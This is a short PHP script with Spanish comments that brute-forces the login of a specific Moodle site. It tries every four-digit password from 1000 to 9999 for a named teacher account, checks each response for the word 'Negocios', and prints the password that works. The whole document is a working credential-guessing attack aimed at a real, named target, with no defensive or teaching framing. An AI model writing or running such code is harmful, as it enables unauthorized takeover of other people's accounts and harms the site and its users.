
<?php

echo "Inciado \n";

for ($clave = 1000; $clave <= 9999; $clave++) {
	
	
//$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
//$txt = $clave."\n";
//fwrite($myfile, $txt);

echo $clave."\n";

$url = 'http://www.globalsymeuro.com/GlobalsymEuro3/moodle3_euro3/login/index.php';
$data = array('username' => 'profesor@globalsym.com', 'password' => $clave);

// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
if ($result === FALSE) { /* Handle error */ }

//echo $result;
$pos = strpos($result, 'Negocios');

// Nótese el uso de ===. Puesto que == simple no funcionará como se espera
// porque la posición de 'a' está en el 1° (primer) caracter.
if ($pos === false) {
    
} else {

echo "La clave es " . $clave;
echo "\n";
$clave=9999;
 
}

} 


?>